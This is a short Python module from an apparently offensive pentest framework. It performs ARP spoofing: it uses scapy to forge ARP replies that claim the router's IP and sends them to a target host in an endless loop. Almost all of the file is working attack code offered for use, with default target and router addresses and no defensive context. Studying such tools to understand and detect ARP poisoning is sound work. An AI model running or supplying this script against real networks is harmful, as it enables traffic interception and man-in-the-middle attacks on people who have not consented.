#		Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
import sys
from core import bcolors
from collections import OrderedDict
import os
import subprocess
from scapy.all import *
from time import sleep

#info about module
#modules name (must be same as filename)
modulename = "arp_spoof"
#module version
version = "1.0"
#description
desc = "arp spoof"
#creator's github
github = "4shadoww"
#created by (creators name)
createdby = "4shadoww"
#email
email = "4shadoww0@gmail.com"
#alert user if root permissions not available (remove variable below if root permissions needed)
needroot = 1

#list of variables
variables = OrderedDict((
('target', '192.168.1.3'),
('router', '192.168.1.1'),
))

#description for variables
vdesc = [
'target ip address',
'router ip address',
]

#additional help notes
help_notes = bcolors.WARNING+"This module will not work without root permission!"+bcolors.END

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print (bcolors.OKBLUE + "[*]Setting Up ..." + bcolors.END)
	print(bcolors.OKGREEN + "[OK]" + bcolors.END)
	sleep(1)
	print(bcolors.OKBLUE + "[*]ARP Poisoning Has Been Started ..." + bcolors.END)
	packet = ARP()
	packet.psrc = variables['router']
	packet.pdst = variables['target']
	while 1:
		send(packet, verbose=False)
		sleep(1)